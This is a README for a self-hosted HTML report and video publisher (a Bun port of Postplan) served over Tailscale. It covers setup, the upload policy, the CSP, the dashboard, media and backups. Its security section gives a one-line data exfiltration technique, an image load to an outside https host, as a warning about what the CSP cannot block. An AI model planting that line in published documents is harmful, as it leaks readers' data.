# comms

Publishes one self-contained HTML file to a stable URL on the tailnet. Re-upload
the same file and it becomes a new version at the same URL. This is where the
`html-communication` skill sends a report when you want to read it on your phone
instead of in a terminal.

It is a Bun port of [Postplan](https://www.npmjs.com/package/postplan), Theo
Browne's publisher (MIT), by way of
[geekdada's Cloudflare Workers port](https://github.com/geekdada/postplan). It
runs on the Mac mini `minj` as a launchd agent, on SQLite and the local
filesystem, so nothing touches a cloud account. The stock `postplan` CLI talks
to it unchanged — point it at this server's URL and it cannot tell the
difference.

The worker source in `src/` is based on geekdada's port, with the changes
below and local recording support. `src/adapters.js` supplies the bindings
Cloudflare would otherwise provide: D1 becomes `bun:sqlite`, R2 becomes a directory, and the
assets binding becomes a 404. There is no build step; Bun runs the ESM source
directly.

The environment variables keep their `POSTPLAN_` names for compatibility with
the HTML upload tool. It was called `postplan-local` before it moved into this repo.

## Differences from upstream

- **Uploads require an API key.** Upstream allows anonymous uploads. Here they
  return 401, because this host now executes uploaded JavaScript.
- **Inline scripts run.** The served Content-Security-Policy is
  `script-src 'unsafe-inline'` instead of `'none'`, so a report's own behaviour
  works: glossary links, collapsible sections, reader-hidden blocks.
- **Local recordings play.** `media-src 'self'` lets a document play recordings
  served by this host. It does not allow video from other hosts or ports.
- **Recording pages buffer before playback.** The page requests automatic
  preloading and shows the continuously playable portion of the video as a
  percentage. Play and native controls unlock at 30% buffered, or sooner when
  the browser stops preloading with enough to start, as desktop Chrome does for
  a paused video. Downloading
  continues during playback; slow connections can still run out of buffered
  video. “Download fully before playing” instead fetches the entire file with
  byte-based progress, then plays the completed local copy. Safari may limit
  automatic preloading until a user gesture; use the full-download button if
  it stops short of 30%. Failed downloads can be retried. Leaving the page
  cancels a transfer that is still running. These controls apply to
  `/m/` recording pages; embedded videos in uploaded reports keep their own player.
- **A browser keeps a recording for an hour.** `/media/` answers with
  `Cache-Control: private, max-age=3600`, so streamed bytes stay in the
  browser's HTTP cache, and after the hour an `If-None-Match` check costs a 304
  instead of the file. A full download is also kept in the page's Cache Storage
  and plays straight from it when the recording is opened again within the hour;
  older copies are removed the next time any recording page opens. Chrome reuses
  both: after leaving for the uploads page and coming back, it sent no video
  bytes. Safari may not keep streamed video in its HTTP cache, so on an iPhone
  rely on the full download. A generated media name never gets new bytes, so a
  cached copy cannot go stale, but a deleted recording can keep playing for up
  to an hour on a device that had it.

So a document is checked twice. `src/html-policy.js` rejects, at upload time:
external scripts (`<script src>` and the SVG spelling `<script href>`), forms,
iframes, frames, `<frameset>`, `<portal>`, `<object>`, `<embed>`, `<applet>`,
`<base>`, `<link>`, inline event handlers, `javascript:` URLs and meta refresh —
including inside a `<template>`, whose children the parser keeps in a separate
fragment. The served CSP is then:

```
default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';
img-src https: data:; media-src 'self'; connect-src 'none'; base-uri 'none'; form-action 'none'
```

### What that does not stop

`connect-src 'none'` blocks `fetch`, `XMLHttpRequest`, WebSockets and
`sendBeacon`. It does not block image loads or navigation, and `img-src https:`
allows any https host. An inline script in a published document can therefore
still reach the outside world with `new Image().src = "https://elsewhere/?" +
data`, or by navigating away — both carrying whatever the document contains.

For reports you wrote yourself that is fine. Publishing someone else's document
is a different question, and these two layers do not answer it: treat an upload
as code you are choosing to run in your readers' browsers. `tests/api.test.js`
pins the CSP header and every upload rejection listed above.

## Run it

From `tools/comms` in the agents repo:

```sh
bun install
cp .env.example .env     # then set POSTPLAN_BOOTSTRAP_API_KEY to a real secret
chmod 600 .env
bun run migrate          # idempotent; safe to run again
bun start
bun test
```

`bun start` refuses to boot without `POSTPLAN_BOOTSTRAP_API_KEY` or before the
migrations have run, rather than failing on the first request.

### Configuration

| Variable | Default | Meaning |
|---|---|---|
| `POSTPLAN_BOOTSTRAP_API_KEY` | required | The key that may upload. Mint further keys with `POST /api/api-keys`. |
| `PORT` | `3775` | Local port. |
| `HOST` | `127.0.0.1` | Bind address. Loopback on purpose; Tailscale does the exposing. Move it off loopback and the IP rate limit and `source_ip` below stop being trustworthy, because clients can then set the forwarding header themselves. |
| `POSTPLAN_DATA_DIR` | `./data` | Database and published documents. |
| `POSTPLAN_PUBLIC_BASE_URL` | request origin | The origin used in returned links. |
| `MAX_HTML_BYTES` | `524288` | Size cap per document (512 KB). |
| `MAX_MEDIA_BYTES` | `268435456` | Size cap per recording (256 MB). Uploads stream to disk; Bun's body ceiling allows this or the JSON body limit, whichever is larger. |
| `UPLOAD_BODY_LIMIT` | `2mb` | Size cap on the whole JSON request. |
| `UPLOAD_IP_RATE_LIMIT_MAX` | `60` per minute | Uploads per client IP, counted before authentication. Over the tailnet the IP is the peer address from `X-Forwarded-For`, which Tailscale Serve sets and does not let a client override. When that header is present nothing else is consulted, so `CF-Connecting-IP` and `X-Real-IP` cannot be used to forge it. |
| `UPLOAD_RATE_LIMIT_MAX` | `30` per minute | Uploads per API key. |
| `POSTPLAN_SESSION_SECRET` | unset | Browser sign-in via shoo.dev. Left unset here, so `/settings/api-keys` answers 503. The uploads dashboard needs no browser sign-in. The API is unaffected. |

## Browse uploads

Open [Comms](https://minj.tail794979.ts.net:8774/) or `/dashboard` to browse
HTML reports and videos across all accounts. No browser login is needed: access
is controlled by the deployment's Tailscale policy. Deleted and disabled reports
are omitted.

Uploads from the same project share one row that expands when tapped; an upload
with no siblings stays a row of its own. Groups are ordered by their newest
upload, and items inside a group are newest first. `/dashboard?open=<project>`
opens with that group expanded.
A search box and an All / Reports / Videos switch narrow the list; both need
script, so without it the page shows everything. A recording page links back
to its group on the dashboard.

Uploads carry no project field, so the project is read from names:

- A report title names it before ` · `, ` — `, ` – `, ` | `, ` - ` or `: `.
  "Smart Reminder · launch video v13" belongs to `smart-reminder`.
- A video filename names it once trailing version, format and generic words are
  removed: `v13`, `33s`, `60fps`, `1080p`, `wide`, `square`, `vertical`, `mobile`,
  `web`, `final`, `promo`, `launch`, `demo` and the like.
  `smart-reminder-launch-v13-wide.mp4` belongs to `smart-reminder` too.

So name a project's files after it, and title its reports `<Project> · <topic>`.
A group is named by its newest report title, or else by its slug in title case.

A group shows its project's logo when one has been published (see below).
Otherwise each row gets a generic icon: video, research (a title with
"research", "findings", "analysis" and the like), digest ("digest",
"changelog", "weekly"…), report, or a folder for a mixed group.

### Delete from the dashboard

Every row has a delete button that asks for confirmation first. Deleting a
report takes down every version, exactly as `DELETE /api/drafts/<id>` does: the
row is marked deleted and its links answer 404, but the version files stay on
disk. Deleting a video removes the file and its metadata, and cannot be undone.

This needs no API key. Anyone who can open the dashboard can delete from it, so
the Tailscale grant on 8774 is the only gate; keep it to people you would hand
the key to. Two checks stop other pages from doing it on a reader's behalf. The
delete request must come from the dashboard's own origin, which rules out
sites on other ports of the same tailnet hostname (the dev pool on 8800 and up,
for example). And the dashboard sends `Cross-Origin-Opener-Policy: same-origin`,
so a published report cannot open it in a window and press its buttons.
Each dashboard delete is logged, with the client address, to the service log.

Uploads, logos and API-key operations keep their API-key requirement.

### Publish a project logo

From `tools/comms`, with the same saved credentials as the other publish
commands:

```sh
bun run publish-logo smart-reminder /path/to/icon.svg
```

The project is the lowercase slug the dashboard shows in `?open=`. SVG, PNG,
JPEG and WebP are accepted up to 256 KB; the type is read from the file, not its
name. Publishing again replaces the logo. A square mark reads better than a
wordmark in the 40 px tile.

The API is `PUT /api/projects/<project>/logo` with the image as a raw body, and
`DELETE /api/projects/<project>/logo` to remove it. `GET /projects/<project>/logo`
serves it to anyone who can reach the service. An SVG opened there directly runs
under a sandboxing CSP, so it cannot run script.

## Publish a document

```sh
npx postplan auth set <api-key> --api-url https://minj.tail794979.ts.net:8774
npx postplan upload ./report.html --api-url https://minj.tail794979.ts.net:8774
```

Re-uploading the same path adds a version at the same URL; `--new` starts a
separate draft. The CLI keeps its config and path-to-draft mapping in
`~/.postplan`. `POSTPLAN_API_URL` works instead of `--api-url`.

Or without the CLI:

```sh
# first publish: returns the draft id
curl -X POST https://minj.tail794979.ts.net:8774/api/uploads \
  -H "authorization: Bearer $POSTPLAN_API_KEY" \
  -H "content-type: application/json" \
  -d "$(jq -n --rawfile html ./report.html '{html: $html, filename: "report.html"}')"

# every later publish of the same report: pass the draft id back
curl -X POST https://minj.tail794979.ts.net:8774/api/uploads \
  -H "authorization: Bearer $POSTPLAN_API_KEY" \
  -H "content-type: application/json" \
  -d "$(jq -n --rawfile html ./report.html --arg id "$DRAFT_ID" \
        '{html: $html, filename: "report.html", draftId: $id}')"
```

Versioning in place is the CLI's doing, not the server's: `postplan` remembers
the path-to-draft mapping in `~/.postplan/drafts.json` and sends `draftId` for
you. Over raw `curl` there is no memory, so a call without `draftId` always
creates a new draft at a new URL — keep the id the first call returned.

Past versions stay reachable at `/d/<draft-id>/v/<n>`. `DELETE /api/drafts/<id>`
unpublishes a draft; `POST /api/drafts/<id>/disable` takes it down with a reason.

### What a document may contain

One self-contained HTML file. Images must be `data:` URIs or `https:` URLs;
there is no companion-file upload, so `<img src="chart.png">` will 404. Inline
`<style>` and `<script>` are fine. 512 KB is the ceiling.

## Publish a recording

MP4, M4V, WebM and MOV files can be stored separately from HTML. Playback depends
on the browser's support for the file's codecs; H.264 MP4 is a good choice for
screen recordings. This service does not transcode video.

From `tools/comms`, using the same saved credentials as the Postplan HTML CLI:

```sh
bun run publish-media /path/to/recording.mp4
```

The command also accepts `POSTPLAN_API_URL` and `POSTPLAN_API_KEY`. It prints:

- `publicUrl`: an HTML page with a video player and download link.
- `mediaUrl`: the video itself, usable as the `src` of a `<video>` in a report.
- `downloadUrl`: the video with an attachment header for downloading.
- `mediaId`: the generated filename, for deletion through the API.

Each upload creates a new recording and link. There is no recording version
history. Recordings appear alongside HTML reports on `/dashboard`. To put it in a report, use the media URL returned
by the upload, or its path when the report is hosted on the same service:

```html
<video controls playsinline src="/media/<mediaId>"></video>
<a href="/media/<mediaId>?download=1" download>Download recording</a>
```

The API accepts a raw binary body at `POST /api/media?filename=recording.mp4`,
with the same bearer API key as HTML uploads. Authenticated uploads are rate
limited, and the 256 MB default is checked both against `Content-Length` and
while receiving the stream. Files only become available after upload completes.
The server allows 60 seconds of inactivity during a transfer.
The original filename is kept for the player and download; the disk filename
is generated, so requests cannot address arbitrary host files.

`GET /m/<mediaId>` serves the player; `GET /media/<mediaId>` serves the video.
Byte ranges support seeking, and `HEAD` reports size without sending the file.
Reading is allowed to anyone with the link who can reach this service through
Tailscale, like HTML drafts. `DELETE /api/media/<mediaId>` requires a key from
the uploading account and removes both the recording and its metadata.

No client configuration is needed. The server sends `media-src 'self'` in the
HTML policy, and the browser enforces it. Tailscale must separately allow access
to port 8774.

## Reach

| Layer | Address | Who can get there |
|---|---|---|
| Bun process | `127.0.0.1:3775` | this machine only |
| Tailscale Serve | `https://minj.tail794979.ts.net:8774` | `group:principals` through the TCP 8774 grant to `tag:server` |
| Tailscale Funnel | off | deliberately; it would make the same hostname public |

The live Loki policy and its repo reference were aligned on 2026-10-03 to allow
TCP 8774 for `group:principals`, which currently contains
`jonaswahringer@github`. Membership in the tailnet alone does not grant access.
The backend on 3775 remains loopback-only and denied by the tailnet policy.
Minj's effective rules confirm access from Jonas's MacBook and iPhone addresses;
local health probes return 200. A Comms request from those devices remains
unverified. See `/Users/minj/Projects/loki/guides/tailscale-network.md` for the
network workflow and `tailscale-acl.json` in that repo for the policy reference.

```sh
tailscale serve status
tailscale serve --bg --https=8774 http://127.0.0.1:3775   # publish it
tailscale serve --https=8774 off                          # remove
```

## Running as a service

A launchd agent keeps it up and restarts it after a reboot.

```sh
cp com.wahringer.comms.plist.example com.wahringer.comms.plist
# put the real key in the copy, then
chmod 600 com.wahringer.comms.plist
cp com.wahringer.comms.plist ~/Library/LaunchAgents/
launchctl load ~/Library/LaunchAgents/com.wahringer.comms.plist
```

```sh
# restart after a code change
launchctl unload ~/Library/LaunchAgents/com.wahringer.comms.plist
launchctl load   ~/Library/LaunchAgents/com.wahringer.comms.plist

curl -s -o /dev/null -w '%{http_code}\n' https://minj.tail794979.ts.net:8774/healthz  # 200
tail -f ~/.local/share/comms/comms.log
```

### The service runs from this checkout

The plist points launchd at `/Users/minj/Projects/agents/tools/comms/server.js`
in this working tree — not at the installed copy under
`~/.local/share/agents/source`, which has no `node_modules` and is replaced on
every `agents update`. So the running service depends on this directory staying
where it is, with its `node_modules` present, on whatever branch is checked out
here. Things that would take it away:

- `git clean -xd`, which deletes `node_modules` — never run it in this repo.
- `git clean -d` or `git stash -u` while `tools/` is still untracked.
- checking out a branch that predates `tools/comms`.

Any of those leaves launchd restarting a server that cannot start. If it
happens, restore the directory, run `bun install`, and reload the agent.

The plist hard-codes three absolute paths: `/opt/homebrew/bin/bun`, this
directory, and the data directory `~/.local/share/comms` (which appears again in
both log paths). Adjust all three if anything moves.

launchd appends stdout and stderr to `~/.local/share/comms/comms.log` verbatim
and never rotates it, so truncate it when it grows. The server dates its own startup,
shutdown and fatal lines; a stack trace thrown by the runtime itself arrives
undated, so read it against the neighbouring timestamped line. Lines written
before this was added carry no date at all.

The service needs free disk. Every upload writes a version file and a SQLite WAL
transaction under `~/.local/share/comms`, so a full volume breaks uploads while the process
stays up and `/healthz`, which only reads, may well keep answering 200.
`KeepAlive` cannot help with that — it is a disk problem, not a process one.
Check `df -h /` when uploads start failing.

## Data and secrets

State lives in `~/.local/share/comms`, deliberately outside every repo so an
`agents update` cannot disturb it:

```
postplan.sqlite                                        metadata, no document bodies
drafts/drafts/<draft-id>/versions/<id>.html            one file per version
drafts/.r2-meta/drafts/<draft-id>/versions/<id>.html.json   the content type R2 would have stored
comms.log                                              service output
media/<mediaId>                                        recording bytes
media/<mediaId>.json                                   filename, type, size and owning account
projects/<project>.<svg|png|jpg|webp>                  project logos for the dashboard
```

The doubled `drafts/` is not a typo: `drafts` is the bucket directory, and the
object keys the worker writes already start with `drafts/`.

Copy that directory and you have copied every published report. Nothing else is
state.
The database runs in WAL mode, so a file-by-file copy of a running service is not
a consistent snapshot. Either stop the service and copy the
directory, or back it up live with SQLite's own backup:

```sh
sqlite3 ~/.local/share/comms/postplan.sqlite ".backup /path/to/comms-backup.sqlite"
cp -R ~/.local/share/comms/drafts /path/to/drafts-backup
cp -R ~/.local/share/comms/media /path/to/media-backup
cp -R ~/.local/share/comms/projects /path/to/projects-backup
```

The API key lives in `.env` and inside the installed plist, both `chmod 600` and
both gitignored. `.env.example` and `com.wahringer.comms.plist.example` carry
`replace-me` and are the only committed copies. The server never logs the key,
and keys are stored only as SHA-256 hashes; comparison against the bootstrap key
is constant-time.

## What the local adapters do not do

`src/adapters.js` is honest about its limits rather than quietly wrong: R2's
`range` and `onlyIf` options throw from `get()` and `put()` instead of being
ignored, and D1 result `meta` carries only the counters SQLite can actually
supply — `size_after` and `served_by` are left out rather than faked. Where D1
raises, so does this: an unknown column in `first(column)`, or `undefined` passed
to `bind()`. The pieces `src/` uses are covered by `tests/adapters.test.js`.

## Licence

MIT, inherited from upstream. See `LICENSE`.

## Diagnose playback on a device

Open `/diagnostics/media/<mediaId>` for an existing recording. The page can
compare streamed playback with playback from a fully downloaded copy. It records
response-header timing, download duration and video events in a copyable text box.
Measurements stay in the browser; there is no telemetry endpoint or stored log.
A download starts only when requested and times out after 60 seconds. Use a small
recording first on cellular connections.
